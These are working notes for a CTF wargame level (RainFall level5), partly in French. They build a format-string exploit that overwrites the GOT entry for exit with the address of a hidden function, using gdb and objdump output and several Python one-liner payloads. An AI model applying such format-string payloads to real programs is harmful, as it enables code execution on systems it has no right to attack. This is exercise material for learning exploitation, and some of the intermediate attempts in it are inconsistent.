### TIPS

Pour lancer un payload dans gdb

```bash
(gdb) run < <(python -c 'print ("salut" * 5)';)
Starting program: /home/user/level5/level5 < <(python -c 'print ("salut" * 5)';)
salutsalutsalutsalutsalut
```

---

```bash
evel5@RainFall:~$ readelf -s level5 | grep o
Symbol table '.dynsym' contains 10 entries:
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
Symbol table '.symtab' contains 73 entries:
    31: 08048420     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    32: 0804984c     1 OBJECT  LOCAL  DEFAULT   25 completed.6159
    33: 08049850     4 OBJECT  LOCAL  DEFAULT   25 dtor_idx.6161
    39: 080485a0     0 FUNC    LOCAL  DEFAULT   13 __do_global_ctors_aux
    57: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    59: 08049844     0 OBJECT  GLOBAL HIDDEN    24 __dso_handle
    67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o

```

```bash
(gdb) x o
0x80484a4 <o>:	0x83e58955
```

address of function o: `080484a4` == `\xa4\x84\x04\x08`

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

offset of buffer of printf is `3` --> 4 je crois

---

```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

Address of exit is `08049838` == `\x38\x98\x04\x08`

## Payload

value to write = adress of o = `0x080484a4` = `134513828`

Lets do 2 writes

value 1: `0x 0000 84a4` = `33956`
value 2: `0x 0001 0804` = `67588`

cible 1 = `08049838` == `\x38\x98\x04\x08`

cible 2 = cible1 + 2 == `804983A` == `\x3a\x98\x04\x08`

```python
exploit = ""
exploit += "\x38\x98\x04\x08"	//cible1
exploit += "\x3a\x98\x04\x08"	//cible2
exploit += "%33948x"			// padding to get to value 1 (33956 - 8 = 33948)
exploit += "%4$hn"				//write cible 1
exploit += "%33624x"			//paddding to get to value 2 (67588 - 33956 - 8 = 33624)
exploit += "%5$hn"
```

```bash
(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948x" + "%4$n" + "%33632x" + "%5$n")';cat) | ./level5

run < <(python -c 'print ("\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%3$33948x" + "%3$n" + "%3$33624x" + "%4$n")';)
```

Needs to overwrite 0x08049838 (exit) with 0x080484a4 (o)

It means writing 0x0804 (2052) at 0x08049838 + 2 = 0x0804983a (high order)
and 0x84a4 (33956) at 0x08049838 (low order)

Now we have to figure out the value to set for the padding: Here is the forumla:
[The value we want] - [The byte already wrote] = [the value to set]

Let's start with the low order bytes :
It'll be 33956 - 8 = 33948, because we already wrote 8 bytes, the two 4 bytes addresses

Then the high order bytes :
It'ill be 2052 - 33956 = -31904 --> 33632 in uint with overflow

No we can construct the exploit
It'ill be : \x38\x98\x04\x08\x3a\x98\x04\x08%33948x%4$hn%33632x%5$hn

    \x38\x98\x04\x08 or 0x08049838 points to the low order of the target adress
    \x3a\x98\x04\x08 or 0x0804983a points to the high order of the target adress 
    %33948x will write 33948 bytes of padding
    %4$hn will write 33956 (0x84a4) at address 0x08049838
    %33632x will write 33632 byte of padding
    %5$hn will write 2052 (bc of overflow) at address 0x0804983a

```bash
(python -c 'print ("\x38\x98\x04\x08\x3a\x98\x04\x08%33948x%4$hn%33632x%5$hn")';cat) | ./level5
```

## Second try

Needs to overwrite 0x08049838 (exit) with 0x080484a4 (o)

It means writing 0x0804 (2052) at 0x08049838 + 2 = 0x0804983a (high order)
and 0x84a4 (33956) at 0x08049838 (low order)

Now we have to figure out the value to set for the padding: Here is the forumla:
[The value we want] - [The byte already wrote] = [the value to set]

Let's start with the high order bytes :
It'll be 2052 - 8 = 2044, because we already wrote 8 bytes, the two 4 bytes addresses

Then the low order bytes :
It'ill be 33956 - 2052 = 31904

No we can construct the exploit
It'ill be : \x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn
    \x3a\x98\x04\x08 or 0x0804983a points to the high order of the target adress 
    \x38\x98\x04\x08 or 0x08049838 points to the low order of the target adress
    %2044x will write 2044 bytes of padding
    %4$hn will write 2052 (0x0804) at address 0x0804983a
    %31904x will write 31904 byte of padding
    %5$hn will write 33956 (0x9838) at address 0x08049838


```bash
(python -c 'print ("\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")';cat) | ./level5
```
